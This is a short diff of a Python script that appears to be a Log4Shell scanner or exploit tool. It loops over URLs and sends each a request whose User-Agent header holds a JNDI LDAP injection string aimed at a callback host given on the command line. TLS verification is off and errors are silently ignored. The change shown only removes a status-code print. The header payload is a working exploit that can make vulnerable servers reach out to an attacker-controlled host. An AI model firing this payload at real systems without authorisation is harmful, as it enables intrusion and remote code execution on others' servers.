@@ -14,8 +14,7 @@ if len(argv) > 1:
             headers = {'User-Agent': '${jndi:ldap://'+argv[2]+'/a}'}
             url = url.strip()
             print('[!] Testing {}'.format(url))
-            r = requests.get(url, headers=headers, params=params, verify=False, timeout=10)
-            print('[!] Status code {}'.format(r.statuscode))
+            requests.get(url, headers=headers, params=params, verify=False, timeout=10)
         except:
             pass
         sleep(0.3)
